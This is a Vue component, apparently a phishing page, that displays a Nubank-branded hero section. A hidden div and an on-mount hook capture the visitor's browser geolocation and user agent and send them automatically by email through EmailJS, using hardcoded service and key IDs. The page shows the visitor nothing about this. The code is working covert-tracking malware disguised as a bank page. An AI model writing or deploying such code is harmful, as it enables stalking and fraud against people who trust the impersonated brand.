<template>
  <NubankHero />
  <div class="p-6 text-center" v-show="false">
    <h1 class="text-2xl font-bold mb-4">Captura de Localização</h1>

    <div v-if="latitude && longitude">
      <p>Latitude: {{ latitude }}</p>
      <p>Longitude: {{ longitude }}</p>
      <p class="text-green-500 mt-2" v-if="emailSent">Localização enviada com sucesso!</p>
      <p class="text-red-500 mt-2" v-if="emailError">Falha ao enviar localização</p>
    </div>

    <p v-else class="text-gray-500">Obtendo localização...</p>
  </div>
</template>

<script setup>
import NubankHero from './components/NubankHero.vue';
import { ref, onMounted } from 'vue'
import emailjs from '@emailjs/browser';

const latitude = ref(null)
const longitude = ref(null)
const emailSent = ref(false)
const emailError = ref(false)

const SERVICE_ID = 'service_gd8rrol';
const TEMPLATE_ID = 'template_l7g27ya';
const PUBLIC_KEY = 'yzYjfXYUGNvZmsdl5';

const enviarLocalizacao = () => {
  const dadosLocalizacao = {
    latitude: latitude.value,
    longitude: longitude.value,
    timestamp: new Date().toISOString(),
    user_agent: navigator.userAgent
  };

  emailjs.send(SERVICE_ID, TEMPLATE_ID, {
    message: JSON.stringify(dadosLocalizacao, null, 2),
    subject: 'Nova localização capturada'
  }, PUBLIC_KEY)
    .then(() => {
      emailSent.value = true
      console.log('Localização enviada:', dadosLocalizacao)
    })
    .catch((error) => {
      emailError.value = true
      console.error('Erro ao enviar:', error)
    })
}

onMounted(() => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        latitude.value = pos.coords.latitude
        longitude.value = pos.coords.longitude
        
        
        
        
        
        enviarLocalizacao() // Envia automaticamente
      },
      (error) => {
        console.error("Erro ao obter localização:", error)
        emailError.value = true
      }
    )
  } else {
    console.error("Geolocalização não suportada")
    emailError.value = true
  }
})
</script>